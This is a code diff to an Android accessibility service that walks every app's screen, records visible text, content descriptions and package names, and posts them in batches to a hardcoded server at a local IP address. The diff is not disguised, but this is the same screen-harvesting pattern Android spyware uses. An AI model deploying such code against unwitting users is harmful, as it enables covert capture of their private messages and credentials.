@@ -7,24 +7,19 @@ import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
 import org.json.JSONArray;
-
 import java.io.OutputStreamWriter;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.util.HashSet;
 import java.util.List;
 import java.util.Set;
-import java.util.concurrent.ExecutorService;
-import java.util.concurrent.Executors;
 
 public class MyAccessibilityService extends AccessibilityService {
-
     private static final String TAG = "MyAccessibilityService";
     private static final int BATCH_SIZE = 100;
     private final Set<String> loggedNodes = new HashSet<>();
     private final Set<String> tmpNodes = new HashSet<>();
     private final Set<String> loggedPackages = new HashSet<>();
-    private final ExecutorService executorService = Executors.newSingleThreadExecutor();
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
@@ -63,21 +58,16 @@ public class MyAccessibilityService extends AccessibilityService {
             nodeContentDescription = null;
         }
 
-        String nodeDescription = indentation + packageName + " " + className + " " +
+        String sb = indentation + className + " " +
                 (nodeText != null ? nodeText : "") + " " +
                 (nodeContentDescription != null ? nodeContentDescription : "");
 
-        if ((!isEmpty(nodeText) || !isEmpty(nodeContentDescription)) && loggedNodes.add(nodeDescription)) {
-            StringBuilder sb = new StringBuilder(indentation);
-            sb.append(className).append(" ")
-                    .append(nodeText != null ? nodeText : "").append(" ")
-                    .append(nodeContentDescription != null ? nodeContentDescription : "");
+        if (loggedNodes.add(sb)) {
+            Log.d(TAG, sb);
+            tmpNodes.add("\n"+packageName);
+            tmpNodes.add(sb);
 
-            Log.d(TAG, sb.toString());
-        }
-
-        if ((!isEmpty(nodeText) || !isEmpty(nodeContentDescription)) && tmpNodes.add(nodeDescription)) {
-            if (tmpNodes.size() == BATCH_SIZE) {
+            if(tmpNodes.size() == BATCH_SIZE){
                 sendDatatoServer(new HashSet<>(tmpNodes));
                 tmpNodes.clear();
             }
@@ -93,15 +83,11 @@ public class MyAccessibilityService extends AccessibilityService {
         return lastDotIndex != -1 ? className.substring(lastDotIndex + 1) : className;
     }
 
-    private boolean isEmpty(CharSequence str) {
-        return str == null || str.length() == 0;
-    }
-
     private void sendDatatoServer(Set<String> data) {
-        executorService.execute(() -> {
+        new Thread(() -> {
             HttpURLConnection urlConnection = null;
             try {
-                URL url = new URL("http://192.168.1.10:5000");
+                URL url = new URL("http://192.168.1.8:5000");
                 urlConnection = (HttpURLConnection) url.openConnection();
                 urlConnection.setRequestMethod("POST");
                 urlConnection.setDoOutput(true);
@@ -124,7 +110,7 @@ public class MyAccessibilityService extends AccessibilityService {
                     urlConnection.disconnect();
                 }
             }
-        });
+        }).start();
     }
 
     private void handleNotificationStateChanged(AccessibilityEvent event) {
